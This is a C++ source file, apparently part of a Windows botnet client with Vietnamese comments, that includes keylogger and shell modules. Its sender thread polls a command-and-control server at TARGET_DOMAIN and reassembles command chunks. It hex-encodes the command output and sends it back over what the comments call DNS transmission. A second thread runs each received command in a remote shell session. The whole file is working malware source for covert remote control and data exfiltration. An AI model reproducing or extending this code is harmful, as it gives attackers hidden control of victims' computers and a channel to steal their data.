#include "Botnet.h"
#include "KeyLogger.h"
#include "Network.h"
#include "ConsoleClient.h"
#include "Shell.h"
#include <string>

void EnqueueSend(const std::string& s) {
    std::lock_guard<std::mutex> lk(queue_mutex);
    send_queue.push(s);
}

void EnqueueExecute(const std::string& s) {
    std::lock_guard<std::mutex> lk(execute_mutex);
    execute_queue.push(s);
}

DWORD senderBotnetThread(LPVOID lpParam)
{
    while (true) {
        // Buoc 1: Poll lay command chunks tu server
        std::vector<std::string> command_chunks;
        size_t chunk_offset = 0;

        std::cout << "\n[Polling] Checking for new command from server...\n";

        while (true)
        {
            // Gui Type P packet de poll chunk tiep theo
            int retcode = sendDataTypeP(connectionId, packetNumber, chunk_offset, TARGET_DOMAIN.c_str());

            if (retcode == 1) {
                // Nhan thanh cong mot chunk
                std::string chunk_data;
                {
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);

                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, nullptr, 0, nullptr, nullptr);
                    if (size_needed > 0) {
                        std::string temp(size_needed - 1, 0);
                        WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, &temp[0], size_needed, nullptr, nullptr);
                        chunk_data = temp;
                    }
                }

                if (!chunk_data.empty()) {
                    std::cout << "  [+] Received chunk " << chunk_offset << " (" << chunk_data.length() << " bytes)\n";
                    command_chunks.push_back(chunk_data);
                    chunk_offset++;
                    Sleep(50); // Delay nho giua cac chunk request
                } else {
                    break;
                }
            } 
            else if (retcode == 0) {
                // Khong con chunk nao (empty response hoac het lenh)
                std::cout << "  [*] End of command chunks (retcode=0)\n";
                break;
            } 
            else {
                // Xay ra loi (retcode == -1)
                std::cout << "  [!] Error polling for chunks (retcode=-1)\n";
                break;
            }
        }

        // Buoc 2: Kiem tra neu co lenh de xu ly
        std::string dataToSend;

        if (!command_chunks.empty()) {
            // Ghep lai lenh day du tu cac chunks
            std::string full_command;
            for (const auto& chunk : command_chunks) {
                full_command += chunk;
            }
            std::cout << "[+] Command reassembled: '" << full_command << "' (" << full_command.length() << " bytes)\n";

            // Dua lenh vao queue de thuc thi
            EnqueueExecute(full_command);
            std::cout << "[+] Command enqueued for execution\n";
        }

        // Buoc 3: Kiem tra queue co du lieu de gui lai
        {
            std::lock_guard<std::mutex> lock(queue_mutex);
            if (!send_queue.empty()) {
                dataToSend = send_queue.front();
                send_queue.pop();
            }
        }

        // Buoc 4: Gui du lieu tro lai server theo chunks
        if (!dataToSend.empty()) {
            std::cout << "[Sending] Transmitting result (" << dataToSend.length() << " bytes) in chunks...\n";
            std::cout << "[Debug] Data preview: '" << dataToSend.substr(0, std::min<size_t>(50, dataToSend.length())) << "...'\n";
            
            // Chia dataToSend thanh cac chunks voi kich thuoc max_len
            size_t offset = 0;
            size_t offset_number = 0;
            const size_t totalLen = dataToSend.size();
            int consecutiveFailures = 0;
            const int MAX_FAILURES = 3;
            
            while (offset < totalLen) {
                size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                std::string chunk = dataToSend.substr(offset, chunkLen);
                offset_number = offset / max_len;
                
                std::cout << "  [+] Sending chunk " << offset_number << " (packet #" << packetNumber << ", " << chunkLen << " bytes)\n";
                std::cout << "  [Debug] Chunk hex preview: " << chunk.substr(0, std::min<size_t>(20, chunk.length())) << "...\n";
                
                // Chuyen chunk sang hex cho DNS transmission
                std::string chunkHex = convertToHex(chunk.c_str());
                std::cout << "  [Debug] Hex length: " << chunkHex.length() << " chars\n";
                
                int success = sendDataTypeC(connectionId, packetNumber, offset_number,
                                            TARGET_DOMAIN.c_str(), chunkHex.c_str());

                if (success == 0) {
                    // Gui thanh cong -> tang packet number
                    std::cout << "  [✓] Chunk sent successfully\n";
                    packetNumber++;
                    if (packetNumber > 999) {
                        packetNumber = 0;
                    }

                    offset += chunkLen;
                    consecutiveFailures = 0;
                    Sleep(50);
                } else {
                    consecutiveFailures++;
                    std::cout << "  [!] Failed to send chunk (attempt " << consecutiveFailures << "/" << MAX_FAILURES << ")\n";
                    
                    if (consecutiveFailures >= MAX_FAILURES) {
                        std::cout << "  [✗] Max failures reached, skipping packet #" << packetNumber << " to continue\n";
                        // Bo qua packet that bai va chuyen sang chunk tiep theo
                        packetNumber++;
                        if (packetNumber > 999) {
                            packetNumber = 0;
                        }
                        offset += chunkLen;
                        consecutiveFailures = 0;
                        Sleep(100);
                    } else {
                        // Cho va thu lai
                        std::cout << "  [~] Retrying after delay...\n";
                        Sleep(500);
                    }
                }
            }
            
            if (offset >= totalLen) {
                std::cout << "[+] All result chunks sent successfully\n";
            } else if (consecutiveFailures >= MAX_FAILURES) {
                std::cout << "[!] Transmission failed, data discarded\n";
            }
        } else {
            // Khong co du lieu gui, cho mot chut truoc chu ky tiep theo
            Sleep(2000);
        }
    }
    return 0;
}

DWORD handle_botnet(LPVOID lpParam)
{
    ConsoleClient client;
    Shell shell(&client);

    if (!shell.CreateSession()) {
        std::cerr << "[!] Failed to create shell session\n";
        return 1;
    }

    std::cout << "[+] Shell session created successfully\n";

    while (true) {
        std::string commandToExecute;


        {
            std::lock_guard<std::mutex> lock(execute_mutex);
            if (!execute_queue.empty()) {
                commandToExecute = execute_queue.front();
                execute_queue.pop();
            }
        }


        if (!commandToExecute.empty()) {
            std::cout << "[Execute] Running command: '" << commandToExecute << "'\n";
            bool success = shell.ExecuteCommand(commandToExecute);
            
            if (success) {
                std::cout << "[Execute] Command executed successfully\n";
                // Output will be automatically sent via ConsoleClient::Send -> EnqueueSend
            } else {
                std::cout << "[Execute] Command execution failed\n";
            }
        } else {
            // No command to execute, wait briefly
            Sleep(100);
        }
    }

    // Cleanup (unreachable in infinite loop, but kept for completeness)
    shell.Dispose();
    return 0;
}